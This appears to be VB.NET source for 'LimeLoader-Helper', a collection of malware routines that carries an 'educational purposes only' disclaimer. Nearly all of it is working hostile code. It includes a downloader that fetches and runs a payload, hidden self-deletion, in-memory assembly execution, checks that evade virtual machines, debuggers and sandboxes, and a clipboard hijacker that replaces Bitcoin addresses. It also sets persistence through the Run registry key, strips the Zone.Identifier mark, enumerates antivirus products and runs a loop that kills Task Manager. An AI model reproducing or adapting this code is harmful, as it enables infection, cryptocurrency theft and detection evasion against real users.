Module Program

    '       ││ Author     : NYAN CAT
    '       ││ Name       : LimeLoader-Helper * Jan/9/2019

    '       ││ Contact    : https://github.com/NYAN-x-CAT

    '       ## This program Is distributed for educational purposes only.

    Sub Main()
        MsgBox(BotID)
        MsgBox("Application Run as Admin? " + Privileges().ToString)
        MsgBox(AV)
        ProcessKiller("Taskmgr")
    End Sub

#Region "Download File From Web [Downloader]"
    Public Sub DownloadFromWeb()
        Dim FilePath As String = IO.Path.GetTempFileName + "_Payload.exe"
        Using WC As New Net.WebClient
            WC.DownloadFile("UR", FilePath)
        End Using
        Diagnostics.Process.Start(FilePath)
    End Sub
#End Region

#Region "Delete Itself"
    Public Sub SelfDelete()
        Dim Del As New Diagnostics.ProcessStartInfo With {
                           .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Diagnostics.Process.GetCurrentProcess.MainModule.FileName,
                           .WindowStyle = Diagnostics.ProcessWindowStyle.Hidden,
                           .CreateNoWindow = True,
                           .FileName = "cmd.exe"
                           }
        Diagnostics.Process.Start(Del)
        Environment.Exit(0)
    End Sub
#End Region

#Region "Run File In Memory [.NET]"
    Private Delegate Function ExecuteAssembly(ByVal sender As Object, ByVal parameters As Object()) As Object
    Public Sub Reflection(ByVal buffer As Byte())
        Try
            Dim parameters As Object() = Nothing
            Dim assembly As Reflection.Assembly = Threading.Thread.GetDomain().Load(buffer)
            Dim entrypoint As Reflection.MethodInfo = assembly.EntryPoint
            If entrypoint.GetParameters().Length > 0 Then
                parameters = New Object() {New String() {Nothing}}
            End If
            Dim assemblyExecuteThread As Threading.Thread = New Threading.Thread(Sub()
                                                                                     Threading.Thread.BeginThreadAffinity()
                                                                                     Threading.Thread.BeginCriticalRegion()
                                                                                     Dim executeAssembly As ExecuteAssembly = New ExecuteAssembly(AddressOf entrypoint.Invoke)
                                                                                     executeAssembly(Nothing, parameters)
                                                                                     Threading.Thread.EndCriticalRegion()
                                                                                     Threading.Thread.EndThreadAffinity()
                                                                                 End Sub)
            assemblyExecuteThread.Start()
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region "Anti Virtual Machines"
    Public Sub AntiVirtualMachines()
        Dim VM = Microsoft.Win32.Registry.LocalMachine.CreateSubKey("System\CurrentControlSet\Services\Disk\Enum\").GetValue("0", "")
        If VM.ToString.ToLower.Contains("vmware") OrElse VM.ToString.ToLower.Contains("qemu") Then
            Environment.FailFast(Nothing)
        ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxhook.dll") Then
            Environment.FailFast(Nothing)
        End If
    End Sub
#End Region

#Region "Anti Debug"
    Public Sub AntiDebug()
        If Diagnostics.Debugger.IsLogging OrElse Diagnostics.Debugger.IsAttached Then
            Environment.FailFast(Nothing)
        End If
    End Sub
#End Region

#Region "Anti Sandboxie"
    <Runtime.InteropServices.DllImport("kernel32.dll")>
    Public Function LoadLibrary(ByVal dllToLoad As String) As Boolean
    End Function
    Public Sub AntiSandiboxie()
        If LoadLibrary("SbieDll.dll") Then
            Environment.FailFast(Nothing)
        End If
    End Sub
#End Region

#Region "Replace Bitcoin Wallet [Grabber]"
    Public Sub BitcoinGrabber()
        While True
            Try
                If Windows.Forms.Clipboard.GetText.Length >= 26 AndAlso Windows.Forms.Clipboard.GetText.Length <= 35 Then
                    If Windows.Forms.Clipboard.GetText.StartsWith("1") OrElse Windows.Forms.Clipboard.GetText.StartsWith("3") OrElse Windows.Forms.Clipboard.GetText.StartsWith("bc1") Then
                        Dim Replace As Threading.Thread = New Threading.Thread(AddressOf Windows.Forms.Clipboard.SetText)
                        Replace.SetApartmentState(Threading.ApartmentState.STA)
                        Replace.Start("Your Bitcoin Address")
                    End If
                End If
                Threading.Thread.Sleep(100)
            Catch ex As Exception
            End Try
        End While
    End Sub
#End Region

#Region "Install Payload To Computer"
    Public Sub InstallPayload()
        Try
            Dim ClientFullPath As String = IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Payload.exe")
            Using Drop As New IO.FileStream(ClientFullPath, IO.FileMode.Create)
                Dim Client As Byte() = IO.File.ReadAllBytes(Diagnostics.Process.GetCurrentProcess.MainModule.FileName)
                Drop.Write(Client, 0, Client.Length)
            End Using
            Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(IO.Path.GetFileName(ClientFullPath), ClientFullPath)
            Diagnostics.Process.Start(ClientFullPath)
            Environment.Exit(0)
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region "Give Bot a Static Name [BotID]"
    Public Function BotID() As String
        Dim S As String = Nothing
        S += Environment.UserDomainName
        S += Environment.UserName
        S += Environment.MachineName

        Dim md5Obj As New Security.Cryptography.MD5CryptoServiceProvider
        Dim bytesToHash() As Byte = Text.Encoding.ASCII.GetBytes(S)
        bytesToHash = md5Obj.ComputeHash(bytesToHash)
        Dim strResult As New Text.StringBuilder
        For Each b As Byte In bytesToHash
            strResult.Append(b.ToString("x2"))
        Next
        Return strResult.ToString
    End Function
#End Region

#Region "Encrypt Data Using AES"
    Function AES_Encryptor(ByVal input As Byte(), ByVal key As String) As Byte()
        Dim AES As New Security.Cryptography.RijndaelManaged
        Dim Hash As New Security.Cryptography.MD5CryptoServiceProvider
        Dim ciphertext As String = ""
        Try
            AES.Key = Hash.ComputeHash(Text.Encoding.UTF8.GetBytes(key))
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = input
            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
        End Try
        Return Nothing
    End Function
    Function AES_Decryptor(ByVal input As Byte(), ByVal key As String) As Byte()
        Dim AES As New Security.Cryptography.RijndaelManaged
        Dim Hash As New Security.Cryptography.MD5CryptoServiceProvider
        Try
            AES.Key = Hash.ComputeHash(Text.Encoding.UTF8.GetBytes((key)))
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
        End Try
        Return Nothing
    End Function
#End Region

#Region "Delete Zone Identifier"
    <Runtime.InteropServices.DllImport("kernel32.dll", CharSet:=Runtime.InteropServices.CharSet.Auto, BestFitMapping:=False, ThrowOnUnmappableChar:=True, SetLastError:=True)>
    Function DeleteFile(<Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.LPTStr)> ByVal filepath As String
            ) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
    End Function
    Sub DeleteZoneIdentifier(ByVal filePath As String)
        Try : DeleteFile(filePath + ":Zone.Identifier") : Catch : End Try
    End Sub
#End Region

#Region "Edit Registry Keys"
    Function DelteValue(ByVal Key As String, ByVal Name As String) As Boolean
        Try
            Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Lime-Loader").DeleteValue(Name)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    Function GetValue(ByVal Key As String, ByVal Name As String) As String
        Try
            Return Microsoft.Win32.Registry.CurrentUser.CreateSubKey(Key).GetValue(Name, "")
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    '"Software\Lime-Loader"
    Function SetValue(ByVal Key As String, ByVal Value As String, ByVal Name As String)
        Try
            Microsoft.Win32.Registry.CurrentUser.CreateSubKey(Key).SetValue(Name, Value)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
#End Region

#Region "Get Anti Virus Software"
    Public Function AV() As String
        Try
            Dim AVname As String = Nothing
            Dim searcher As New Management.ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
            Dim instances As Management.ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As Management.ManagementObject In instances
                AVname = queryObj("displayName").ToString()
            Next
            If AVname = String.Empty Then AVname = "No AV"
            AVname = AVname.ToString
            Return AVname
            searcher.Dispose()
        Catch
            Return "No AV"
        End Try
    End Function
#End Region

#Region "If Application Run as Admin"
    Public Function Privileges() As Boolean
        Try
            Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
            Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
            If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
                Return True
            Else
                Return False
            End If
        Catch ex As Exception
            Return False
        End Try
    End Function
#End Region

#Region "Kill Process"
    Public Sub ProcessKiller(ByVal Name As String)
        While True
            For Each p As Diagnostics.Process In Diagnostics.Process.GetProcesses()
                Try
                    If p.ProcessName.ToLower = Name.ToLower Then
                        p.Kill()
                    End If
                Catch ex As Exception
                End Try
            Next
            Threading.Thread.Sleep(10)
        End While
    End Sub
#End Region

End Module
